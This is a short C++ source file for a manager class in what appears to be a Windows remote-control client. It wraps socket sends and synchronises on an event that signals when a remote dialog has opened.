#include "StdAfx.h"
#include "Manager.h"
#include "ClientSocket.h"



CManager::CManager(CClientSocket *pClient)
{
	m_pClient = pClient;
	m_pClient->setManagerCallBack(this);      //Kernel
	m_hEventDlgOpen = CreateEvent(NULL, true, false, NULL);
}

CManager:: ~CManager()
{

}
void CManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
{

}


int CManager::Send(LPBYTE lpData, UINT nSize)
{
	int	nRet = 0;
	try
	{
		nRet = m_pClient->Send((LPBYTE)lpData, nSize);
	}catch(...){};
	return nRet;
}



void CManager::WaitForDialogOpen()
{

	
	WaitForSingleObject(m_hEventDlgOpen, INFINITE);
	//必须的Sleep,因为远程窗口从InitDialog中发送COMMAND_NEXT到显示还要一段时间
	Sleep(150);
}

void CManager::NotifyDialogIsOpen()

{
	SetEvent(m_hEventDlgOpen);
}